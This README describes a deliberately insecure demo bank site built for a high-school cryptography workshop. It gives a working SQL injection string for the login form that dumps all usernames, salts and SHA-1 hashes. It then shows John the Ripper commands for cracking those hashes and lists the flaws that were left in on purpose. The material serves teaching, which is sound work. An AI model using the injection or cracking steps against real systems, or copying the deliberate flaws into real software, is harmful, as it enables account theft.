Anaflow Bank (Insecure Website)
-------------------------------

This website is a demonstration in a cryptography workshop at Independence 
High School, run by Andy Chen and Nick Hirning. It is meant to serve as a
simplified model of how password hashing and SQL injection can work.


Get Started
-----------

As a prerequisite, make sure you have web.py (version 0.3) and SQLite 
capabilities. Begin by creating the database of user accounts:

sqlite3 BankAccount.db < create_accounts.sql

Then, to run the website, execute:

python anaflow_bank.py [optional port number, default is 8080]


Demonstration Overview
----------------------

In the demonstration, we perform an SQL injection via the login form. We set
the username to be:

' OR 1=1 UNION SELECT GROUP_CONCAT(Username || ':' || PasswordHash || ':' || Salt, '  ||  ') AS Amount FROM BankAccount WHERE '1' = '1

(The password can be any string.) This allows us to see all of the users' 
salts and password hashes, which are SHA-1 for this purpose. We then use 
John the Ripper (JTR) to expose any weak passwords. Despite each account 
having its own salt, JTR can crack salted SHA-1 hashes in a single file.
To do so, create a blank password file, and format each username/salt/hash 
combination on each line (without the brackets):

[username]:$dynamic_24$[hash]$[salt]

For example:

admin:$dynamic_24$d97e0269f76f350d85c09244cffd41439fe90a99$*Utf&+s5

Then, run JTR to recover some of the passwords:

./john --incremental [password file]
./john --show [password file] 

Here, we use the MacOS version of John 1.7.9-jumbo-7.


Disclaimer
----------

Do NOT use this code for any application meant to be cryptographically secure.
We intentionally left this system vulnerable to attack. Major flaws include:

- SQL injection (an adversary can display the table of user accounts)
- Malfunctioning SQL queries with certain usernames (generalization of the 
	first flaw)
- SHA-1 hashing instead of slow hashing, such as bcrypt (though for large 
	user databases, this could require client-side hashing. However, an 
	attacker who has stolen the table of users and password hashes can then 
	send a hash directly to the server and successfully login.)
- Lack of security checks, mainly in the Python web.py backend